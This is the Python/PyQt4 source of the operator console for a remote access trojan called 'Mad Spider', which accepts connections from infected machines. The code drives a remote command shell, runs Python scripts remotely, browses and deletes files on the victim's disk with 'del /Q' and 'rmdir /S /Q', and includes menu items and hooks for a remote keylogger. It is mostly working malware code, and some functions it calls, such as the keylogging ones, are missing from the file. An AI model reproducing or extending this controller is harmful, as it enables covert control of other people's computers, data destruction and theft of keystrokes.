# -*- coding: utf-8 -*- 

from threading import Thread
import sys
import socket
import time
import ast
import datetime
import inspect
import os
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs import linesnum, gui, style, credits, keycodes


class ImgWidget(QLabel):
    def __init__(self, imagepath, parent=None):
        super(ImgWidget, self).__init__(parent)

        pic = QPixmap(imagepath)
        out = pic.scaled(QSize(32, 32), Qt.KeepAspectRatio)
        self.setAlignment(Qt.AlignCenter)
        self.setStyleSheet(style.fileExplorerImg)
        self.setPixmap(out)


class MainDialog(QWidget, gui.Ui_Form):
    # noinspection PyUnresolvedReferences
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        self.statusok('Initializing Py IDLE', self.lineno())
        # init idle with lines
        self.llines = linesnum.LineTextWidget()
        self.LeditorLayout.addWidget(self.llines)
        self.rlines = linesnum.LineTextWidget()
        self.ReditorLayout.addWidget(self.rlines)

        self.statusok('Initializing tray', self.lineno())
        # init tray
        icon = QIcon('assets/icon.png')
        self.trayIcon = SystemTrayIcon(icon)
        self.trayIcon.show()

        self.statusok('Initializing variables', self.lineno())
        # Initializing variables
        self.acceptthreadState = False
        self.active = False
        self.nextcmd = ''
        self.sockind = 0
        self.server = '0.0.0.0'
        self.port = 0
        self.timeout = 5
        self.gui = QApplication.processEvents
        self.cursor = QTextCursor(self.consoleText.document())
        self.displayText(msg=credits.credit)

        self.statusok('Initializing signals', self.lineno())
        # Initializing signals
        self.commandLine.returnPressed.connect(self.runCommand)
        self.socketsList.itemDoubleClicked.connect(self.connectSocket)
        self.runserverButton.clicked.connect(self.scannerStart)
        self.stopserverButton.clicked.connect(self.scannerStop)
        self.refreshexplorerButton.clicked.connect(self.explorerGetlist)
        self.explorerTable.doubleClicked.connect(self.openFolder)
        self.upexplorerButton.clicked.connect(self.parentFolder)
        self.mkdirexplorerButton.clicked.connect(self.createFolder)
        self.mkfileexplorerButton.clicked.connect(self.createFile)
        self.removeexplorerButton.clicked.connect(self.deleteContent)
        self.explorerPathEntry.returnPressed.connect(self.openPath)
        self.executeButton.clicked.connect(self.executeScript)
        self.connect(self, SIGNAL('triggered()'), self.closeEvent)

        self.connect(self.tabWidget, SIGNAL('currentChanged(int)'), self.tabDetector)

        # Initializing combobox change Event
        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.driveChange)

        #self.explorerTable.setContextMenuPolicy(self.contextMenuEvent)

        self.statusok('Set placeholder text for command line', self.lineno())
        # Set placeholder text for command line
        self.commandLine.setPlaceholderText('type command here...')

        self.statusok('Initializing explorers custom menu', self.lineno())
        # Initializing explorer right click menu
        self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.explorerMenu)
        self.socketsList.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.socketsList, SIGNAL('customContextMenuRequested(const QPoint&)'), self.serversMenu)

        # Finish initializing
        self.statusok('Initialized', self.lineno())

        self.tabWidget.setEnabled(True)


    # Detect tabs switch
    def tabDetector(self):

        # Check if switched to explorers tab
        if self.tabWidget.currentIndex() == 2:
            self.explorerGetlist()

    # END: TabWidget functions
    
    # START: socket functions
    # listen for clients
    def scannerStart(self):
        if not self.runserverButton.isChecked():
            self.statusok('Set listen button to checked', self.lineno())
            # set listen button to checked
            self.runserverButton.setChecked(True)
        else:
            self.statusok('Get IP address from line entry', self.lineno())
            # get IP address from line editor
            self.server = self.ipaddressLine.text()
            self.statusok('Get port number from line entry', self.lineno())
            # get port number from line entry
            self.port = int(self.portLine.text())
            self.runserverButton.setChecked(True)
            self.stopserverButton.setChecked(False)
            self.statusok('Start scan sockets', self.lineno())
            self.scanSockets(self.port)


    # stop listening for clients
    def scannerStop(self):

        # Buttons
        if not self.stopserverButton.isChecked():
            self.stopserverButton.setChecked(True)
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)
        else:

            # Close all connection and terminate socket
            self.acceptthreadState = False
            try:
                self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shd.connect(('127.0.0.1', self.port))
                self.shd.close()
            except:
                pass
            if self.active:
                self.socks[self.sockind].close()
                self.active = False
                self.c.close()

            # GUI Transformation
            self.clientscountLabel.setText('0')
            self.runserverButton.setChecked(False)
            self.stopserverButton.setChecked(True)
            self.socketsList.clear()
            self.displayText(msg=credits.credit)
            self.setWindowTitle('Mad Spider - Client')
            #self.stopServer()
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)


    # make new variables, clear all text
    # listen for clients in new thread
    def scanSockets(self, port):
        self.statusok('Initializing variables', self.lineno())
        # Initializing variables
        self.socks = []
        self.sockItems = []
        self.counter = 0
        self.socketsList.clear()
        self.commandLine.setText('')
        self.acceptthreadState = True
        self.statusok('Initializing new thread for listen connections', self.lineno())
        # Initializing new thread for listen connections
        self.listenthread = Thread(target=self.listenConnections, args=(port,))
        self.listenthread.setDaemon(True)
        self.listenthread.start()


    # listen for clients
    # accept connections
    # add to socketlist widget
    def listenConnections(self, port):
        #self.statusok('Initializing socket', self.lineno())
        # Initializing socket
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # telling the OS that you know what you're doing and you still want to bind to the same port
        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #self.statusok('Bind address >> {}:{}'.format(self.server, port), self.lineno())
        # Bind address
        self.c.bind((self.server, int(port)))
        #self.statusok('Start listen for connections', self.lineno())
        # Start listen for connections
        self.c.listen(128)
        while self.acceptthreadState == True:
            try:
                #self.statusok('Try accept connection', self.lineno())
                # Try accept connection
                self.s, self.a = self.c.accept()
            except:
                #self.statusno('No connection detected', self.lineno())
                continue

            if self.acceptthreadState == False:
                #self.statusno('Stoped listening for connections', self.lineno())
                return
            if self.s:

                #self.statusok('Set timeout None', self.lineno())
                # Set timeout None
                self.s.settimeout(self.timeout)

                #self.statusok('Save connected socket', self.lineno())
                # Save connected socket
                self.socks += [self.s]

                #self.statusok('Save connected address', self.lineno())
                # Save connected address
                self.sockItems += [self.a]
                self.counter += 1

                #self.statusok('Add connection to servers list', self.lineno())
                # Add connection to servers list
                itm = QListWidgetItem('[-%s-]  %s' % (str(self.counter), self.a[0]))
                itm.setIcon(QIcon(r'assets/tick.png'))
                self.socketsList.addItem(itm)
                self.clientscountLabel.setText(str(self.socketsList.count()))
                self.statusok('New connection from {}'.format(str(self.sockItems[self.sockind])), self.lineno())
                self.trayIcon.showMessage('New Connection', 'From {}'.format(str(self.sockItems[self.sockind])), self.lineno())

    # connect to client
    def connectSocket(self):
        try:
            self.sockind = int(self.socketsList.currentItem().text().split('-')[1]) - 1
        except:
            self.msg(text='Not connected', title='Error')
            return
        self.displayText(header='Connecting to %s' % str(self.sockItems[self.sockind]))
        try:
            self.active = True

            self.statusok('Send Activate message', self.lineno())
            # Send activate message to target
            self.Send('Activate')

            try:
                self.statusok('Recieve activate message from target', self.lineno())
                # Recieve activate message from target
                self.data = self.Receive()

                if self.data != '':
                    self.displayText(msg=self.data.split('XORXORXOR13')[0])
                    self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
                    self.statusok('Connected to {}'.format(str(self.sockItems[self.sockind])), self.lineno())
                    self.tabWidget.setEnabled(True)
            except socket.error:
                self.statusno('Error while recieve message from target', self.lineno())
                self.statusok('Close connection', self.lineno())
                # Error while recieve message from target
                self.socks[self.sockind].close()
                time.sleep(0.8)
                self.active = False

        except socket.error:
            time.sleep(0.8)
            self.active = False

    # while close program, connect himself for shutdown socket
    def closeEvent(self, event):
        if self.acceptthreadState:
            self.acceptthreadState = False
            self.KeyLoggingState = False

            self.statusok('Initializing shutdown signal socket', self.lineno())
            # Initializing shutdown signal socket
            self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.statusok('Send shutdown signal to quit thread', self.lineno())
            # Send shutdown signal to quit thread
            self.shd.connect(('127.0.0.1', self.port))

            self.statusok('Quit application', self.lineno())
            # App Exit
            QApplication.exit()
        else:
            try:
                self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shd.connect(('127.0.0.1', self.port))
            except Exception, e:
                print e
            QApplication.exit()

    # send socket    
    def Send(self, cmd, end="[ENDOFMESSAGE]"):
        try:
            self.statusok('Send bytes', self.lineno())
            # Send bytes
            self.socks[self.sockind].sendall((cmd + end).encode('utf-8'))
        except socket.error:
            self.statusno('Error', 'An existing connection was forcibly closed by the remote host')


    # recieve socket
    def Receive(self, end="[ENDOFMESSAGE]"):
        data = ""

        self.statusok('Recieve bytes', self.lineno())
        # Recieve bytes
        try:
            l = self.socks[self.sockind].recv(1024)
            while l:
                time.sleep(0.1)
                data += l
                if data.endswith(end):
                    break
                else:
                    self.gui()
                    l = self.socks[self.sockind].recv(1024)
        except socket.timeout:
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)
            self.displayText()
            self.statusno('Connection lost with ' + self.sockItems[self.sockind][0], self.lineno())
            return 'ConnectionError'
        return data[:-len(end)].decode('utf-8')
            
    # END: socket functions


    # START: remote scripting functions
    # execute script remotely
    def executeScript(self):

        self.statusok('Send script to remote host', self.lineno())
        # Send script to remote host for execute
        self.Send('runscript ' + str(self.llines.getTextEdit()))

        self.statusok('Recieve executed scripts output', self.lineno())
        # Recieve executed scripts output
        data = self.Receive()

        self.statusok('Update output', self.lineno())
        # Update output console
        #self.outputConsole.setHtml(data.split('</p>')[-1])
        
    # END: remote scripting functions

    # START: explorer functions
    # get list of content from remote folder
    def explorerGetlist(self):
        def img(bool, ext):
            if os.path.exists(os.path.join('assets', 'extensions', ext + '.png')):
                return os.path.join('assets', 'extensions', ext + '.png')
            if bool:
                return os.path.join('assets', 'extensions', '_blank.png')
            else:
                return os.path.join('assets', 'extensions', 'folder.png')

        def type(bool):
            if bool:
                return 'File'
            else:
                return 'Folder'

        # Turn combo signal off
        self.comboInEditMode = True

        # Clear Combobox
        self.explorerDrivesDrop.clear()

        # Get logical disk drives captions
        self.Send('wmic logicaldisk get caption')
        self.data = self.Receive()

        # Set captions in combobox
        for i in self.data.split('Caption')[-1].split('\n'):
            if ':' in i:
                self.explorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))

        # Set path
        self.explorerPathEntry.setText(self.data.split('\n')[0][self.data.find('>')+1:].replace('</p>', ''))

        # Get active drive caption
        self.explorerDrivesDrop.setCurrentIndex(self.explorerDrivesDrop.findText(self.data.split('</p>')[0].split('>')[-1].split('\\')[0], Qt.MatchFixedString))

        # Turn combo signal on
        self.comboInEditMode = False

        # Initializing table
        self.explorerTable.clearContents()
        self.explorerTable.sortItems(0)

        self.statusok('Send command to remote host', self.lineno())
        # Send command for recieve contents list
        self.Send('ls')

        self.statusok('Recieve contents list', self.lineno())
        # Recieve contents list
        self.data = self.Receive()

        self.statusok('Set contets list in table', self.lineno())
        # Show list
        dic = ast.literal_eval(self.data.split('\n\n')[1])
        self.explorerTable.setRowCount(len(dic))
        for n, i in enumerate(dic):
            try:
                ext = dic[i]['name'].split('.')[-1]
            except Exception, e:
                self.statusno('Error while parsing directory', self.lineno())
                ext = ''
            self.explorerTable.setCellWidget(n, 0, ImgWidget(img(dic[i]['type'], ext)))
            item = QTableWidgetItem(type(dic[i]['type']))
            self.explorerTable.setItem(n, 1, item)
            item = QTableWidgetItem(dic[i]['name'])
            self.explorerTable.setItem(n, 2, item)
        self.explorerContentLabel.setText('Directories: %s Files: %s' % (str(len([i for i in dic if dic[i]['type'] is False])), str(len([i for i in dic if dic[i]['type'] is True]))))

    # Change Drive
    def driveChange(self):
        if not self.comboInEditMode:
            self.Send('cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())))
            try:
                if 'Error opening directory' in self.Receive():
                    warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
                    warn.setStyleSheet(style.msgboxStyle)
                    warn.exec_()
            except:
                pass
            self.explorerGetlist()

    # open remote folder from path entry
    def openPath(self):
        self.Send('cd %s' % self.explorerPathEntry.text())
        if 'Error opening directory' in self.Receive():
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
            warn.setStyleSheet(style.msgboxStyle)
            warn.exec_()

        self.explorerGetlist()

    # open remote folder
    def openFolder(self):

        self.statusok('Get folder name', self.lineno())
        # Get folder name
        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text()

        if type == 'Folder':

            self.statusok('Choose new folder', self.lineno())
            # Choose new folder
            self.Send('cd %s' % name)

            self.statusok('Recieve new folders contents list', self.lineno())
            # Recieve new folders contents list
            self.Receive()

            self.statusok('Update table', self.lineno())
            # Update table
            self.explorerGetlist()

    # open parent folder
    def parentFolder(self):

        self.statusok('Choose parent folder', self.lineno())
        # Choose parent folder
        self.Send('cd ..')

        self.statusok('Get new folders contents list', self.lineno())
        # Get new folders contents list
        self.Receive()

        self.statusok('Update table', self.lineno())
        # Update table
        self.explorerGetlist()

    # create folder
    def createFolder(self):
        dlg = QInputDialog(self)
        dlg.setInputMode(QInputDialog.TextInput)
        dlg.setWindowTitle('New Folder Name')
        dlg.setLabelText('Enter Name: ')
        dlg.setOkButtonText('Create')
        dlg.setCancelButtonText('Cancel')
        dlg.setStyleSheet(style.popupDialog)
        ok = dlg.exec_()
        self.Send('mkdir %s' % dlg.textValue())
        self.Receive()
        self.explorerGetlist()

    def createFile(self):
        dlg = QInputDialog(self)
        dlg.setInputMode(QInputDialog.TextInput)
        dlg.setWindowTitle('New File Name')
        dlg.setLabelText('Enter Name: ')
        dlg.setOkButtonText('Create')
        dlg.setCancelButtonText('Cancel')
        dlg.setStyleSheet(style.popupDialog)
        ok = dlg.exec_()
        self.Send('type NUL > %s' % dlg.textValue())
        self.Receive()
        self.explorerGetlist()

    def deleteContent(self):
        try:
            warn = QMessageBox(QMessageBox.Warning, 'Confirm', 'Are you sure to delete?')
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            warn.setStyleSheet(style.msgboxStyle)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                if self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text() == 'File':
                    self.Send('del /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text())
                else:
                    self.Send('rmdir /S /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text())
                if self.Receive() == 'ConnectionError':
                    return
            else:
                return
        except Exception as e:
            print e
            return
        self.explorerGetlist()

    def explorerMenu(self, point):
        self.eMenu = QMenu(self)

        try:
            if self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text() == 'Folder':
                self.eMenu.addAction(QIcon('assets\\extensions\\folder.png'), 'Open folder', self.openFolder)
                self.eMenu.addSeparator()
        except:
            pass

        self.eMenu.addAction(QIcon('assets\\new_file.png'), 'New File', self.createFile)
        self.eMenu.addAction(QIcon('assets\\new_folder.png'), 'New Folder', self.createFolder)

        self.eMenu.addSeparator()

        self.eMenu.addAction(QIcon('assets\\refresh.png'), 'Refresh', self.explorerGetlist)

        self.eMenu.addSeparator()

        try:
            self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text()
            self.eMenu.addAction(QIcon('assets\\remove.png'), 'Delete', self.deleteContent)
        except:
            self.eMenu.addAction(QIcon('assets\\remove.png'), 'Delete', self.deleteContent).setDisabled(True)

        # Show explorers right click menu
        self.eMenu.exec_(self.explorerTable.mapToGlobal(point))
        
    # END: explorer functions

    
    # START: shell functions
    # display console text
    def displayText(self, msg='', header='', error=''):
        self.consoleText.setHtml('''
        <p align="center" style="color: #ffffff; background-color: #7d0e0e">%s</p>
        <p align="center" style="color: #ffffff; background-color: green">%s</p>
        <p align="left" style="color: #ffffff;">%s</p>
        ''' % (error, header, msg.replace('\n', '<br>').replace('\t', '   ')))

    # run shell command
    def runCommand(self):
        if self.active:
            try:

                # TEMP:
                if self.commandLine.text() == 'StartLogging':
                    self.Keylogging()
                if self.commandLine.text() == 'GiveStokes':
                    self.CaptureKeyStokes()

                self.statusok('Send shell command', self.lineno())
                # Send cmd command
                self.Send(unicode(self.commandLine.text()))

                self.statusok('Recieve answer for shell command', self.lineno())
                # Recieve answer to shell command
                self.data = self.Receive()

            except socket.error:

                self.statusno('Error with connection', self.lineno())
                # Error with connection
                self.socks[self.sockind].close()

                time.sleep(0.8)
                self.active = False
            if self.data != '':

                self.statusok('Set status output', self.lineno())
                # Set shell output
                self.displayText(header=self.commandLine.text(), msg=self.data.split('XORXORXOR13')[0])
                self.commandLine.setText('')
        else:
            self.displayText(msg='run server and click to client for connect', error='Not connected')
            self.commandLine.setText('')
    
    # END: shell functions

    # START: servers managment functions
    # servers right click menu
    def serversMenu(self, point):
        self.sMenu = QMenu(self)

        self.sMenu.addAction(QIcon('assets\\connect.png'), 'Connect', self.connectSocket)
        self.sMenu.addSeparator()
        self.sMenu.addAction(QIcon('assets\\terminal.png'), 'Remote CMD', self.remoteCMD)
        self.sMenu.addAction(QIcon('assets\\python.png'), 'Remote Python', self.remotePython)
        self.sMenu.addAction(QIcon('assets\\file_manager.png'), 'Remote File Manager', self.remoteExplorer)
        self.sMenu.addAction(QIcon('assets\\keylogger.png'), 'Remote Keylogger', self.remoteKeylogger)
        self.sMenu.addSeparator()
        self.sMenu.addAction(QIcon('assets\\stop.png'), 'Terminate', self.createFolder)


        # Check if server selected
        # Show servers right click menu
        try:
            self.socketsList.currentItem().text()
            self.sMenu.exec_(self.socketsList.mapToGlobal(point))
        except AttributeError:
            pass

    # Switch to CMD tab
    def remoteCMD(self):
        self.tabWidget.setCurrentIndex(0)

    # Switch to Python tab
    def remotePython(self):
        self.tabWidget.setCurrentIndex(1)

    # Switch to File Manager tab
    def remoteExplorer(self):
        self.tabWidget.setCurrentIndex(2)

    # Switch to Keylogger tab
    def remoteKeylogger(self):
    	self.tabWidget.setCurrentIndex(3)
    
    # START: messages functions
    # popup message
    def msg(self, title='', text=''):
        msgbox = QMessageBox()
        msgbox.setStyleSheet(style.msgboxStyle)
        msgbox.setWindowTitle(title)
        msgbox.setText(text)
        msgbox.setIcon(QMessageBox.Critical)
        msgbox.addButton(QPushButton('OK'), QMessageBox.RejectRole)
        tr = msgbox.exec_()

    # returns the current line number in our program
    def lineno(self):
        return inspect.currentframe().f_back.f_lineno

    # display status with success message
    def statusok(self, msg, line):
        self.statusConsoleText.moveCursor(QTextCursor.End)
        self.statusConsoleText.insertHtml(
            '<br><font color="green">[+]</font> <font color=white>(%s)</font> <font color="green">[CODE:%s]</font> - <font color=white>%s</font>' % (
                datetime.datetime.now(), line, msg))

    # display status with error message
    def statusno(self, msg, line):
        self.statusConsoleText.moveCursor(QTextCursor.End)
        self.statusConsoleText.append(
            '<br><font color="red">[-]</font> <font color=white>(%s)</font> <font color="red">[CODE:%s]</font> - <font color=white>%s</font>' % (
                datetime.datetime.now(), line, msg))
        
    # END: messages function


# tray icon
class SystemTrayIcon(QSystemTrayIcon, MainDialog):
    def __init__(self, icon, parent=None):
        # super(SystemTrayIcon, self).__init__(None)
        QSystemTrayIcon.__init__(self, icon, parent)
        self.menu = QMenu(parent)
        self.trExit = self.menu.addAction('Exit')
        self.setContextMenu(self.menu)

        self.trExit.triggered.connect(self._exit)

    def welcome(self):
        self.showMessage('Welcome', 'Welcome to Mad Spider\n2.02 beta', QSystemTrayIcon.Information)

    def show(self):
        QSystemTrayIcon.show(self)
        QTimer.singleShot(100, self.welcome)

    def _exit(self):
        QApplication.exit()


def main():
    app = QApplication(sys.argv)
    # Initializing splashscreen
    splash_pix = QPixmap('assets/splash.png')
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    splash.setMask(splash_pix.mask())
    splash.show()
    time.sleep(3)
    # app.processEvents()
    form = MainDialog()
    form.show()
    splash.finish(form)
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
